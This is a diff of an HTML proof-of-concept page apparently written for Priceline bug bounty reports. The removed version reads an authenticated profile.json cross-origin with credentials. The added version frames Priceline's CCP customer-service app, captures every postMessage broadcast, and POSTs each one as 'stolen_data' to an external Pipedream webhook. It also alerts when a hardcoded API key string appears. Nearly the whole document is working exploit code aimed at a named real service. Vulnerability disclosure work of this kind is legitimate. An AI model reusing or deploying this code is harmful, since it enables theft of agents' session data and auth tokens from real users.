@@ -1,46 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Priceline CORS PoC</title>
-  <style>body{font-family:monospace;padding:20px;max-width:1000px}pre{background:#f4f4f4;padding:15px;overflow:auto;white-space:pre-wrap;word-break:break-all}</style>
+    <title>Priceline CCP Session Hijack PoC</title>
+    <style>
+        body { font-family: sans-serif; margin: 20px; }
+        #log { background: #f4f4f4; padding: 10px; border: 1px solid #ccc; height: 300px; overflow-y: scroll; white-space: pre-wrap; font-family: monospace;}
+        .warning { color: red; font-weight: bold; }
+    </style>
 </head>
 <body>
-  <h1>Priceline CORS Misconfiguration PoC</h1>
-  <p><strong>Reporter:</strong> sshabib via HackerOne</p>
-  <p><strong>Attacker origin:</strong> <span id="origin"></span></p>
-  <p><strong>Target endpoint:</strong> www.priceline.com/next-profile/_next/data/&lt;buildId&gt;/profile.json</p>
-  <hr>
-  <h2>Result</h2>
-  <p>Status: <span id="status">pending...</span></p>
-  <h3>Authenticated response body (read cross-origin with credentials):</h3>
-  <pre id="output">Fetching...</pre>
+    <h2>Priceline CCP - Cross-Origin Session Hijack PoC</h2>
+    <p>This page demonstrates how a malicious website can intercept sensitive agent data broadcasted by the in-scope CCP application.</p>
+    
+    <p class="warning">Do NOT use this for malicious purposes. This is for Bug Bounty demonstration only.</p>
 
-  <script>
-    document.getElementById('origin').innerText = window.location.origin;
+    <!-- The target vulnerable application (In-Scope) -->
+    <iframe src="https://customerservice-ccp.priceline.com/" width="800" height="400" id="ccpFrame" style="border: 2px solid blue;"></iframe>
 
-    fetch('https://www.priceline.com/', { credentials: 'include' })
-      .then(r => r.text())
-      .then(html => {
-        const match = html.match(/"buildId":"([^"]+)"/);
-        if (!match) throw new Error('Could not extract buildId from priceline.com');
-        const buildId = match[1];
-        document.getElementById('output').innerText = 'Build ID extracted: ' + buildId + '\n\nFetching profile...';
+    <h3>Intercepted Data Log:</h3>
+    <div id="log">Waiting for postMessage broadcast...<br></div>
 
-        return fetch('https://www.priceline.com/next-profile/_next/data/' + buildId + '/profile.json', {
-          credentials: 'include',
-          method: 'GET'
-        });
-      })
-      .then(response => {
-        document.getElementById('status').innerText = response.status + ' ' + response.statusText;
-        return response.text();
-      })
-      .then(body => {
-        document.getElementById('output').innerText = body;
-      })
-      .catch(err => {
-        document.getElementById('output').innerText = 'ERROR: ' + err.message;
-      });
-  </script>
+    <script>
+        // Listen for ANY message sent to this window (because CCP uses "*")
+        window.addEventListener("message", function(event) {
+            // Ignore messages from extensions to keep the log clean
+            if (event.source === window) return;
+            
+            const logDiv = document.getElementById("log");
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let dataString = "";
+            try {
+                dataString = JSON.stringify(event.data, null, 2);
+            } catch (e) {
+                dataString = String(event.data);
+            }
+
+            // Log the intercepted data to the screen
+            const logEntry = `[${timestamp}] Message from ${event.origin}:\n${dataString}\n\n-----------------------\n`;
+            logDiv.innerHTML += logEntry;
+            logDiv.scrollTop = logDiv.scrollHeight;
+
+            // Exfiltrate the stolen data to your Pipedream webhook
+            fetch("https://eondm3hfjar18nj.m.pipedream.net/", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    poc_target: "Priceline CCP",
+                    event_origin: event.origin,
+                    stolen_data: event.data
+                }),
+                mode: "no-cors" // no-cors prevents the browser from throwing a CORS error on the fetch
+            });
+            
+            // Pop an alert if we see the API key (Optional visual proof)
+            if(dataString.includes("4LSrIcBTt2U793l5s8CJiGAKDklNf7Px")) {
+                alert("CRITICAL DATA INTERCEPTED!\nAuth Token Stolen.");
+            }
+        }, false);
+    </script>
 </body>
 </html>
